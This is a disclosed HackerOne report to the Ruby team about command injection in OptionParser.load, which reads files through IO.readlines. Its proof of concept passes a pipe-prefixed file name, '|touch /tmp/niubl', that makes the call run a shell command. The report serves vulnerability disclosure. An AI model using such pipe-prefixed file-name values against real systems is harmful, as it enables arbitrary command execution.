# Command injection in OptionParser.load

## Report Details
- **Report ID**: 1090678
- **URL**: https://hackerone.com/reports/1090678
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-01-30T06:14:43.082Z
- **Disclosed**: 2021-03-07T11:45:47.187Z

## Reporter
- **Username**: piao
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
OptionParser.load function use IO.readlines to read file, which can inject `| command ` to exec command. 
poc:
```
require 'optparse'

OptionParser.new do |opts|
  opts.load("|touch /tmp/niubl")
end.parse!
```

## Impact

The command may be executed unintentionally.

## Attachments
No attachments
